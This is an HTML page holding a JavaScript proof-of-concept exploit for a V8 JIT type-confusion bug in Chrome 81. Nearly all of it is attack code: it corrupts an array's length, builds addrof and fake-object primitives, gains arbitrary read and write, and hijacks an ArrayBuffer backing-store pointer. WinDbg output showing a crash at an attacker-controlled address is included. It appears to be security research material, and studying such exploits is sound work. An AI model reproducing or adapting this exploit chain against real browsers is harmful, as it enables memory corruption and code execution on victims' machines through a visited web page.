<pre id="log"></pre>
<script>
alert("HOOK")
// chrome 81

let ab = new ArrayBuffer(0x8);
let bab = new BigUint64Array(ab);
let uab = new Uint32Array(ab);
let fab = new Float64Array(ab);

function itof(_int) {
    bab[0] = _int
    return fab[0]
}

function ftoi(_float) {
    fab[0] = _float
    return bab[0]
}

function i32tof(_low, _up) {
    uab[0] = _low
    uab[1] = _up
    return fab[0]
}

function f32toi(_float) {
    fab[0] = _float
    return [uab[0], uab[1]]
}

function print(str) {
    console.log(str);
    var log = document.getElementById('log');
    if (log) {
        log.innerText += str + '\n';
    }
}

var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

function ftoi(val) {
  fs[0] = val;
  return is[0];
}

function itof(val) {
  is[0] = val;
  return fs[0];
}

function foo(a) {
	let y = 0x7fffffff;

	/* 
	Make sure we fail the first 'if' statement inside 
	'VisitSpeculativeIntegerAdditiveOp'
	*/
	if (a == NaN) y = NaN;

	// Gather type feedback 
	if (a) y = -1;

	let z = (y + 1) | 0;
	
	z = (z == 0x80000000) | 0;
	if (a == 'wellooo') z = -1;

	// [3]
	let arr = new Array(z);
	arr.shift();
	let second = [1.1, 1.1, 1.1];
    let fakeObject = [2.2, 1.1];
	
	return [arr, second, fakeObject];
}

for (let i = 0; i < 20000; i++) {
	foo(true);
}

const ret_value = foo(false);
var oob = ret_value[0];
var control = ret_value[1];
var fakeObject = ret_value[2];
oob[16] = 0x4141;

print(`[.] ${oob.length.toString(16)}`)
print(`[.] ${control.length.toString(16)}`)

function addrof(obj) {
	oob[9] = obj;
	const addr = ftoi(control[1]);
	control[1] = 1.1;
	return addr & 0xffffffffn;
}

let float_map_properties = ftoi(control[3]);
print(`[+] leaked float map: 0x${float_map_properties.toString(16)}`);

// for (let i = 0; i < 20 ; i += 1) {
//     print(`${i} ${ftoi(control[i]).toString(16)}`)
// }
// let [_low, _high] = f32toi(control[9])
// control[9] = i32tof(_low, 0x30)
// print(fakeObject.length.toString(16))

function sandboxRead(address) {
    let [_low, _high] = f32toi(control[9])
    control[9] = i32tof(Number(address)-0x8, 0x30)
    return ftoi(fakeObject[0])
}

function sandboxWrite(address, _value) {
    let [_low, _high] = f32toi(control[9])
    control[9] = i32tof(Number(address)-0x8, 0x30)
    fakeObject[0] = itof(_value)
}

// test = {};
// %DebugPrint(test);
// testAddr = addrof(test);
// testRead = sandboxRead(testAddr);
// print(testRead.toString(16))

let testAb = new ArrayBuffer(0x20)
let testView = new DataView(testAb)
testView.setUint32(0, 0x44434241)
testView.setUint32(4, 0x48474645);
%DebugPrint(testAb);

/*
0:021> dq 0x5dfa08322fc1-1
00005dfa`08322fc0  080406e9`08288349 00000020`080406e9
00005dfa`08322fd0  0a208000`00000000 00000002`000034cd
00005dfa`08322fe0  00000000`00000000 00000000`00000000
00005dfa`08322ff0  080406e9`08288f01 08322fc1`080406e9
00005dfa`08323000  00000000`00000000 00000000`00000020
00005dfa`08323010  000034cd`0a208000 00000000`00000000
00005dfa`08323020  00000000`00000000 08043465`00000000
00005dfa`08323030  08040a15`082d97f5 9999999a`00000006
*/

testViewAddr = addrof(testView);
backingStoreAddr = testViewAddr+0x20n
sandboxWrite(backingStoreAddr, 0x4141414141414141n);
testAbAddr = addrof(testAb);
backingStoreAddr2 = testAbAddr+0x10n
backingStoreAddr1 = testAbAddr+0x18n
let [ignore_b, bottom] = f32toi(itof(sandboxRead(backingStoreAddr2)))
sandboxWrite(backingStoreAddr2, BigInt(ignore_b) + (0x41414141n << 32n))
let [up, ignore_u] = f32toi(itof(sandboxRead(backingStoreAddr1)))
sandboxWrite(backingStoreAddr1, 0x42424242n + (BigInt(ignore_u) << 32n));

%SystemBreak();

testView.setBigUint64(0, 0x4242424242424242n)

/*
0:000> g
(1af0.2d28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!Builtins_DataViewPrototypeSetBigUint64+0x2bc:
00007ffb`b483287c 46881c07        mov     byte ptr [rdi+r8],r11b ds:42424242`41414141=??
0:000> u @rip
chrome!Builtins_DataViewPrototypeSetBigUint64+0x2bc:
00007ffb`b483287c 46881c07        mov     byte ptr [rdi+r8],r11b
00007ffb`b4832880 46887c0701      mov     byte ptr [rdi+r8+1],r15b
00007ffb`b4832885 4288440702      mov     byte ptr [rdi+r8+2],al
00007ffb`b483288a 4688740703      mov     byte ptr [rdi+r8+3],r14b
00007ffb`b483288f 42885c0704      mov     byte ptr [rdi+r8+4],bl
00007ffb`b4832894 4288740705      mov     byte ptr [rdi+r8+5],sil
00007ffb`b4832899 4288540706      mov     byte ptr [rdi+r8+6],dl
00007ffb`b483289e 46884c0707      mov     byte ptr [rdi+r8+7],r9b
*/

while (true) {}

</script>